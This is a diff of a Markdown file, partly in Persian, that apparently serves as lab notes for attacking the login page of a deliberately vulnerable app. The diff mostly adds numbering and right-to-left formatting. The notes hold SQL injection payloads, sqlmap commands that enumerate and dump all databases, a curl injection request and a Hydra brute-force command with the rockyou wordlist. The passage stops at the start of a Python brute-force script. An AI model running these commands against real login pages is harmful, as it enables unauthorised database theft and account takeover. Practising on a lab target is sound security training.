@@ -1,3 +1,5 @@
+1. login with website
+
 ```
 admin' --
 123
@@ -31,50 +33,59 @@ SELECT * FROM vuln_app_user WHERE username='' OR '1'='1' -- ' AND password='...'
 SELECT * FROM auth_user WHERE username='' OR '1'='1'
 ```
 
-# sqlmap
+# 2. sqlmap
 
-1. نصب sqlmap (اگر وجود ندارد):
+<p dir="rtl" align="justify">1. نصب sqlmap (اگر وجود ندارد):</p>
+
 ```
 sudo apt update && sudo apt install sqlmap
 ```
 
-2. اجرای حمله به صفحه لاگین:
+<p dir="rtl" align="justify">2. اجرای حمله به صفحه لاگین:</p>
 
 ```
 sqlmap -u "http://IP-سرور-قربانی/login/" --data="username=admin&password=123" --method=POST --risk=3 --level=5 --dbs
 ```
 
---data: پارامترهای POST ارسالی.
---dbs: لیست پایگاه‌های داده را نمایش می‌دهد.
+<p dir="rtl" align="justify">
+  <ul dir="rtl">
+    	<li>--data: پارامترهای POST ارسالی.</li>
+	<li>--dbs: لیست پایگاه‌های داده را نمایش می‌دهد.</li>
+  </ul>
+</p>
 
-برای حمله پیشرفته‌تر:
+<p dir="rtl" align="justify">برای حمله پیشرفته‌تر:</p>
 
 ```
 sqlmap -u "http://IP-سرور-قربانی/login/" --data="username=admin&password=123" --method=POST --dump-all
 ```
 
-# curl
+# 3. curl
 
 ```
 curl -X POST "http://IP-سرور-قربانی/login/" -d "username=' OR '1'='1' --&password=123"
 ```
 
 
-# Brute Force
+# 4. Brute Force
 
-۱. با ابزارهای خودکار (مثل Hydra یا Burp Intruder)
+<p dir="rtl" align="justify">1. با ابزارهای خودکار (مثل Hydra)</p>
 
 ```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt victim-ip http-post-form "/login:username=^USER^&password=^PASS^:F=login_failed.html"
 ```
 
--l admin: نام کاربری هدف.
--P rockyou.txt: لیست پسوردهای معروف.
-http-post-form: نوع حمله (POST).
-F=login_failed.html: شرط تشخیص شکست (اگر این صفحه نمایش داده شد، پسورد اشتباه است).
+<p dir="rtl" align="justify">
+  <ul dir="rtl">
+    <li>-l admin: نام کاربری هدف.</li>
+	<li>-P rockyou.txt: لیست پسوردهای معروف.</li>
+	<li>http-post-form: نوع حمله (POST).</li>
+	<li>F=login_failed.html: شرط تشخیص شکست (اگر این صفحه نمایش داده شد، پسورد اشتباه است).</li>
+  </ul>
+</p>
 
-2.  با یک اسکریپت پایتون ساده (اگر می‌خواهید خودتان بنویسید)
 
+<p dir="rtl" align="justify">2. با یک اسکریپت پایتون ساده (اگر می‌خواهید خودتان بنویسید)</p>
 
 ```python
 import requests
